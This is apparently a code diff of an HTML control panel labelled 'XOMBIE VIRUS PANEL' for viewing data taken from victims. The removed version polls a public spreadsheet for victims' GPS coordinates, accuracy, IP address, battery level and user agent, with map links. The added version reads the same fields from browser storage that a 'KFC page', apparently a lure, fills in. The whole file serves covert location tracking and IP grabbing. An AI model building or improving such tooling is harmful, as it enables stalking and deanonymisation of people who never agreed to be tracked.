@@ -1,48 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Xombie Panel with Working Map</title>
+  <title>XOMBIE Panel</title>
   <style>
-    body { background:#000; color:#0ff; font-family: monospace; padding:20px;}
-    .entry {border:2px solid #0ff; margin:10px; padding:10px; border-radius:8px;}
-    a {color:#0ff; text-decoration:none;}
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+    }
+    .box {
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin: 10px 0;
+      background: #111;
+    }
+    a { color: #0af; }
   </style>
 </head>
 <body>
-  <h1>📍 Live Location Panel</h1>
-  <div id="panel"></div>
+  <h1>☣️ XOMBIE VIRUS PANEL</h1>
+  <div class="box" id="output">Loading...</div>
 
   <script>
-    async function loadSheet() {
-      const url = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
-      try {
-        const res = await fetch(url);
-        const data = await res.json();
-        const container = document.getElementById('panel');
-        container.innerHTML = '';
-        data.reverse().forEach(row => {
-          const entry = document.createElement('div');
-          entry.className = 'entry';
-          entry.innerHTML = `
-            <p><strong>Lat:</strong> ${row.Latitude}</p>
-            <p><strong>Lon:</strong> ${row.Longitude}</p>
-            <p><strong>Accuracy:</strong> ${row.Accuracy}</p>
-            <p><strong>IP:</strong> ${row.IP}</p>
-            <p><strong>Battery:</strong> ${row.Battery}</p>
-            <p><strong>UserAgent:</strong> ${row.UserAgent}</p>
-            <p><a href="${row.Map}" target="_blank">📍 View on Google Maps</a></p>
-            <p><strong>Time:</strong> ${row.Time}</p>
-          `;
-          container.appendChild(entry);
-        });
-      } catch (e) {
-        document.getElementById('panel').innerText = '⚠️ Error loading data';
-        console.error(e);
-      }
+    const data = JSON.parse(localStorage.getItem("kfcData"));
+    const output = document.getElementById("output");
+
+    if (data) {
+      output.innerHTML = `
+        <b>🕒 Time:</b> ${data.time}<br>
+        <b>📍 Latitude:</b> ${data.lat}<br>
+        <b>📍 Longitude:</b> ${data.lon}<br>
+        <b>🎯 Accuracy:</b> ${data.accuracy} meters<br>
+        <b>🌐 IP:</b> ${data.ip}<br>
+        <b>🔋 Battery:</b> ${data.battery}<br>
+        <b>🧠 User Agent:</b> ${data.ua}<br>
+        <b>📌 Map:</b> <a href="${data.map}" target="_blank">Open in Google Maps</a>
+      `;
+    } else {
+      output.innerText = "❌ No location data found. Please run the KFC page first.";
     }
-    loadSheet();
-    setInterval(loadSheet, 15000);
   </script>
 </body>
 </html>
